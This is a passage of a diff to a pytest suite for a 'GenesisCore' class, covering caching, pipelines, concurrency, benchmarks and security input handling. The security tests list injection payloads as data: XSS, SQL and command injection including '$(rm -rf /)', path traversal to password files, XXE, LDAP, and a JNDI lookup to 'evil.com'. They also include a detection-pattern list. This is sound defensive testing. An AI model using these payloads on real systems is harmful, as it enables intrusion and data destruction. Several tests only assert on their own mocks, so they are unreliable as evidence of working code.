+                with patch.object(self.core, 'cache_set') as mock_cache_set:
+                    # Set up nested mock behaviors
+                    mock_cache_get.return_value = None  # Cache miss
+                    mock_cache_set.return_value = True  # Cache set success
+                    mock_get.return_value.json.return_value = {"api_data": "response"}
+                    
+                    # Test the complete flow
+                    result = self.core.make_request("https://api.test.com/nested")
+                    assert result is not None
+                    
+                    # Verify all mocks were called
+                    mock_cache_get.assert_called()
+                    mock_cache_set.assert_called()
+    
+    def test_mock_property_access(self):
+        """Test mocking property access and attribute manipulation."""
+        with patch.object(self.core, 'config', new_property=lambda self: {"mocked": True}):
+            # Test that property access is mocked
+            assert self.core.config == {"mocked": True}
+        
+        # Test that original property is restored
+        original_core = GenesisCore()
+        assert original_core.config == {}
+
+
+class TestGenesisCoreComplexScenarios:
+    """Test class for complex real-world scenarios."""
+    
+    def setup_method(self):
+        """Set up test instances."""
+        self.core = GenesisCore()
+    
+    def test_multi_step_data_pipeline(self):
+        """Test a complex multi-step data processing pipeline."""
+        pipeline_data = {
+            "input": {"raw_data": "user_input_123"},
+            "steps": [
+                {"type": "validate", "rules": ["not_empty", "alphanumeric"]},
+                {"type": "transform", "operations": ["lowercase", "trim"]},
+                {"type": "enrich", "sources": ["user_db", "analytics"]},
+                {"type": "output", "format": "json"}
+            ]
         }
         
-        # Process data
-        processed_data = self.core.process_data(original_data)
+        # Process through the pipeline
+        result = self.core.process_data(pipeline_data)
+        assert result is not None
         
-        # Verify processed data contains expected transformations
-        assert processed_data is not None
+        # Verify pipeline structure is maintained
+        assert isinstance(result, dict)
+    
+    def test_bulk_data_processing_workflow(self):
+        """Test bulk data processing with error handling and recovery."""
+        bulk_data = [
+            {"id": 1, "data": "valid_data_1"},
+            {"id": 2, "data": None},  # Invalid data
+            {"id": 3, "data": "valid_data_3"},
+            {"id": 4, "data": ""},    # Empty data
+            {"id": 5, "data": "valid_data_5"}
+        ]
         
-        # In a real implementation, you might have a reverse transformation
-        # For now, just verify the structure is maintained
-        if isinstance(processed_data, dict):
-            assert len(processed_data) > 0
+        results = []
+        errors = []
+        
+        for item in bulk_data:
+            try:
+                result = self.core.process_data(item)
+                results.append(result)
+            except Exception as e:
+                errors.append({"item": item, "error": str(e)})
+        
+        # Should have processed most items
+        assert len(results) >= 3
+        # Should have captured errors for invalid items
+        assert len(errors) <= 2
+    
+    def test_api_integration_with_retry_logic(self):
+        """Test API integration with retry logic and fallback mechanisms."""
+        retry_count = 0
+        max_retries = 3
+        
+        def mock_request_with_retries(url, timeout=30):
+            """Mock request that succeeds after retries."""
+            nonlocal retry_count
+            retry_count += 1
+            
+            if retry_count < max_retries:
+                raise ConnectionError(f"Attempt {retry_count} failed")
+            
+            return {"success": True, "attempts": retry_count}
+        
+        with patch.object(self.core, 'make_request', side_effect=mock_request_with_retries):
+            # Test retry logic
+            result = self.core.make_request("https://api.test.com/retry")
+            assert result is not None
+            assert result["success"] is True
+            assert result["attempts"] == max_retries
+    
+    def test_cache_invalidation_scenario(self):
+        """Test cache invalidation and refresh scenarios."""
+        cache_data = {}
+        
+        def mock_cache_get(key):
+            """Mock cache get."""
+            return cache_data.get(key)
+        
+        def mock_cache_set(key, value, ttl=3600):
+            """Mock cache set."""
+            cache_data[key] = value
+            return True
+        
+        with patch.object(self.core, 'cache_get', side_effect=mock_cache_get):
+            with patch.object(self.core, 'cache_set', side_effect=mock_cache_set):
+                # Test cache miss and set
+                result1 = self.core.cache_get("test_key")
+                assert result1 is None
+                
+                # Set cache
+                set_result = self.core.cache_set("test_key", "test_value")
+                assert set_result is True
+                
+                # Test cache hit
+                result2 = self.core.cache_get("test_key")
+                assert result2 == "test_value"
+    
+    def test_configuration_override_scenario(self):
+        """Test configuration override and environment-specific settings."""
+        base_config = {"timeout": 30, "retries": 3}
+        override_config = {"timeout": 60, "new_setting": "override"}
+        
+        # Test base configuration
+        core_base = GenesisCore(config=base_config)
+        assert core_base.config["timeout"] == 30
+        
+        # Test configuration override
+        core_override = GenesisCore(config={**base_config, **override_config})
+        assert core_override.config["timeout"] == 60
+        assert core_override.config["new_setting"] == "override"
+        assert core_override.config["retries"] == 3  # Should retain base values
 
 
-# Additional parameterized tests for edge cases
-@pytest.mark.parametrize("boundary_value", [
-    "",                    # Empty string
-    " ",                   # Single space
-    "\t",                  # Tab character
-    "\n",                  # Newline
-    "\r\n",                # Windows line ending
-    "\0",                  # Null character
-    "\x01\x02\x03",        # Binary data
-    "a" * 1000000,         # Very long string
-    {"": ""},              # Empty key-value
-    {"key": ""},           # Empty value
-    {"": "value"},         # Empty key
-    [],                    # Empty array
-    [[]],                  # Array with empty array
-    [{}],                  # Array with empty object
-    {"a": {"b": {"c": {}}}}, # Deep nesting with empty end
-])
-def test_parameterized_boundary_values(boundary_value):
-    """Test processing of various boundary values that might cause issues."""
+# Additional parameterized tests for comprehensive coverage
+@pytest.mark.parametrize("input_size", [1, 100, 1000, 10000, 100000])
+def test_parameterized_input_sizes(input_size):
+    """Test processing of various input sizes."""
     core = GenesisCore()
+    large_input = "x" * input_size
     
-    # Should handle boundary values gracefully
-    result = core.process_data(boundary_value)
-    assert result is not None or result == boundary_value or result is None
-
-
-@pytest.mark.parametrize("stress_data", [
-    {"keys": {str(i): f"value_{i}" for i in range(10000)}},  # Many keys
-    {"large_array": list(range(50000))},                     # Large array
-    {"deep_nesting": {"level": 1}},                         # Will be made deeper
-    {"mixed_types": [1, "string", [], {}, None, True, 3.14]}, # Mixed types
-    {"unicode_heavy": "🌟" * 1000},                          # Many unicode chars
-])
-def test_parameterized_stress_scenarios(stress_data):
-    """Test processing under various stress scenarios."""
-    core = GenesisCore()
-    
-    # Make deep nesting structure
-    if "deep_nesting" in stress_data:
-        current = stress_data["deep_nesting"]
-        for i in range(100):  # Create 100 levels deep
-            current["level"] = i + 2
-            current["next"] = {"level": i + 3}
-            current = current["next"]
-    
-    # Process stress data
     start_time = time.time()
-    result = core.process_data(stress_data)
-    execution_time = time.time() - start_time
+    result = core.process_data(large_input)
+    end_time = time.time()
     
-    # Should complete reasonably quickly
-    assert execution_time < 10.0  # 10 second limit
     assert result is not None
+    # Should complete within reasonable time regardless of size
+    assert end_time - start_time < 5.0
+
+
+@pytest.mark.parametrize("error_type", [
+    ConnectionError,
+    Timeout,
+    HTTPError,
+    ValueError,
+    TypeError,
+    KeyError,
+    IndexError,
+    AttributeError
+])
+def test_parameterized_error_handling(error_type):
+    """Test handling of various error types."""
+    core = GenesisCore()
+    
+    with patch.object(core, 'make_request') as mock_request:
+        mock_request.side_effect = error_type("Test error")
+        
+        try:
+            result = core.make_request("https://api.test.com")
+            # Should either handle gracefully or re-raise
+            assert result is not None
+        except error_type:
+            # Re-raising is acceptable behavior
+            pass
+
+
+@pytest.mark.parametrize("concurrent_workers", [1, 2, 4, 8, 16, 32])
+def test_parameterized_concurrency_levels(concurrent_workers):
+    """Test performance with different concurrency levels."""
+    core = GenesisCore()
+    
+    def worker(worker_id):
+        """Worker function."""
+        return core.process_data(f"worker_{worker_id}_data")
+    
+    start_time = time.time()
+    
+    with ThreadPoolExecutor(max_workers=concurrent_workers) as executor:
+        futures = [executor.submit(worker, i) for i in range(concurrent_workers * 2)]
+        results = [f.result() for f in futures]
+    
+    end_time = time.time()
+    
+    assert len(results) == concurrent_workers * 2
+    assert all(result is not None for result in results)
+    assert end_time - start_time < 10.0  # Should complete within reasonable time
+
+
+@pytest.mark.parametrize("data_complexity", [
+    {"simple": "value"},
+    {"nested": {"level1": {"level2": "value"}}},
+    {"array": [1, 2, {"nested": "value"}]},
+    {"complex": {"users": [{"id": 1, "profile": {"name": "test"}}]}},
+    {"very_complex": {"a": {"b": {"c": {"d": {"e": {"f": "deep"}}}}}}},
+])
+def test_parameterized_data_complexity(data_complexity):
+    """Test processing of data with various complexity levels."""
+    core = GenesisCore()
+    
+    result = core.process_data(data_complexity)
+    assert result is not None
+    
+    # Should maintain structure type
+    assert type(result) == type(data_complexity)
 
 
 # Security-focused parameterized tests
-@pytest.mark.parametrize("attack_vector", [
-    # Additional XSS vectors
-    "<script>eval('alert(1)')</script>",
-    "<img src=x onerror=eval('alert(1)')>",
-    "<svg><script>alert(1)</script></svg>",
-    "javascript:void(0);alert(1)",
-    "data:text/html,<script>alert(1)</script>",
-    
-    # Additional SQL injection vectors
-    "' OR 1=1 --",
-    "'; EXEC xp_cmdshell('dir'); --",
-    "' UNION SELECT NULL, version() --",
-    "admin' OR 'a'='a",
-    "1' OR '1'='1' /*",
-    
-    # Additional command injection vectors
-    "$(echo vulnerable)",
-    "`echo vulnerable`",
-    "|echo vulnerable",
-    ";echo vulnerable",
-    "&echo vulnerable",
-    
-    # Additional path traversal vectors
-    "../../../../../../etc/passwd",
-    "....\\....\\....\\....\\windows\\system32\\config\\sam",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    
-    # Template injection vectors
-    "${7*7}",
+@pytest.mark.parametrize("malicious_input", [
+    "javascript:alert('xss')",
+    "<script>alert('xss')</script>",
+    "'; DROP TABLE users; --",
+    "../../../etc/passwd",
+    "$(rm -rf /)",
     "{{7*7}}",
-    "#{7*7}",
-    "<%= 7*7 %>",
-    
-    # LDAP injection vectors
-    "*(|(mail=*))",
-    "*)(uid=*))(|(uid=*",
-    "admin)(|(password=*))",
-    
-    # XML/XXE vectors
-    "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
+    "${jndi:ldap://evil.com/a}",
+    "%3Cscript%3Ealert('xss')%3C/script%3E",
+    "\\x3Cscript\\x3Ealert('xss')\\x3C/script\\x3E",
+    "eval('alert(1)')",
 ])
-def test_parameterized_security_vectors(attack_vector):
-    """Test resistance against various security attack vectors."""
+def test_parameterized_security_inputs(malicious_input):
+    """Test that various malicious inputs are handled safely."""
     core = GenesisCore()
     
-    # Process potentially malicious input
-    result = core.process_data(attack_vector)
-    
-    # Should not expose sensitive information
+    result = core.process_data(malicious_input)
     assert result is not None
+    
+    # Should not contain dangerous content
     result_str = str(result)
-    
-    # Check for common sensitive patterns
-    sensitive_patterns = [
-        "root:", "admin:", "password:", "passwd", "etc/passwd",
-        "system32", "config", "cmd.exe", "sh", "bash",
-        "alert(", "eval(", "script>", "javascript:",
-        "DROP TABLE", "DELETE FROM", "INSERT INTO", "UPDATE",
-        "file://", "http://", "ftp://", "SYSTEM",
-    ]
-    
-    for pattern in sensitive_patterns:
-        assert pattern not in result_str, f"Sensitive pattern '{pattern}' found in result"
+    assert "alert(" not in result_str
+    assert "DROP TABLE" not in result_str.upper()
+    assert "etc/passwd" not in result_str
+    assert "rm -rf" not in result_str
 
 
-# Performance regression tests
-@pytest.mark.performance
-def test_performance_regression_baseline():
-    """Establish performance baseline for regression testing."""
+# Performance benchmarks with different scenarios
+@pytest.mark.benchmark
+@pytest.mark.parametrize("operation_count", [100, 1000, 5000])
+def test_benchmark_scalability(operation_count):
+    """Benchmark performance scalability with different operation counts."""
     core = GenesisCore()
     
-    # Standard test data
-    test_data = {"standard": "data", "number": 42, "array": [1, 2, 3]}
-    
-    # Measure baseline performance
-    iterations = 10000
     start_time = time.time()
     
-    for _ in range(iterations):
-        result = core.process_data(test_data)
+    for i in range(operation_count):
+        result = core.process_data(f"benchmark_data_{i}")
+        assert result is not None
     
     end_time = time.time()
     execution_time = end_time - start_time
-    ops_per_second = iterations / execution_time
     
-    # Establish minimum acceptable performance
-    assert ops_per_second > 1000  # At least 1000 ops/second
-    assert execution_time < 10.0  # Complete within 10 seconds
+    ops_per_second = operation_count / execution_time
     
-    # Log performance metrics for regression tracking
-    print(f"Performance baseline: {ops_per_second:.2f} ops/second")
+    # Should maintain reasonable performance regardless of scale
+    assert ops_per_second > 50  # Minimum 50 ops/second
+    assert execution_time < 60.0  # Should complete within 60 seconds
+
+
+# Integration tests with external service simulation
+@pytest.mark.integration
+def test_integration_with_external_services():
+    """Test integration with multiple external services."""
+    core = GenesisCore()
+    
+    services = [
+        {"name": "auth_service", "endpoint": "https://auth.test.com"},
+        {"name": "user_service", "endpoint": "https://users.test.com"},
+        {"name": "data_service", "endpoint": "https://data.test.com"},
+        {"name": "analytics_service", "endpoint": "https://analytics.test.com"}
+    ]
+    
+    with patch.object(core, 'make_request') as mock_request:
+        def service_response(url):
+            """Mock service-specific responses."""
+            if "auth" in url:
+                return {"service": "auth", "token": "test_token"}
+            elif "users" in url:
+                return {"service": "users", "data": []}
+            elif "data" in url:
+                return {"service": "data", "records": []}
+            elif "analytics" in url:
+                return {"service": "analytics", "metrics": {}}
+            else:
+                return {"service": "unknown", "error": "Not found"}
+        
+        mock_request.side_effect = service_response
+        
+        # Test integration with all services
+        results = []
+        for service in services:
+            result = core.make_request(service["endpoint"])
+            results.append(result)
+        
+        assert len(results) == 4
+        assert all(result is not None for result in results)
+        assert results[0]["service"] == "auth"
+        assert results[1]["service"] == "users"
+        assert results[2]["service"] == "data"
+        assert results[3]["service"] == "analytics"
 
 
 if __name__ == "__main__":
-    # Run extended tests with comprehensive options
+    # Run comprehensive tests with full coverage
     pytest.main([
         __file__,
-        "-v",                           # Verbose output
-        "--tb=short",                   # Short traceback format
-        "-x",                           # Stop on first failure
-        "--durations=20",               # Show 20 slowest tests
-        "--strict-markers",             # Strict marker validation
-        "--maxfail=5",                  # Stop after 5 failures
-        "-p", "no:warnings",            # Suppress warnings
-        "--cov=app.ai_backend.genesis_core",  # Coverage for genesis_core
-        "--cov-report=html:htmlcov",    # HTML coverage report
-        "--cov-report=term-missing",    # Terminal coverage report
-        "--cov-report=xml:coverage.xml", # XML coverage report
-        "--junit-xml=test_results.xml", # JUnit XML output
-        "-m", "not slow and not benchmark", # Skip slow and benchmark tests by default
+        "-v",
+        "--tb=short",
+        "--strict-markers",
+        "--cov=app.ai_backend.genesis_core",
+        "--cov-report=html:htmlcov",
+        "--cov-report=term-missing",
+        "--cov-report=xml",
+        "--junit-xml=test_results.xml",
+        "--durations=20",
+        "-x"  # Stop on first failure for debugging
     ])
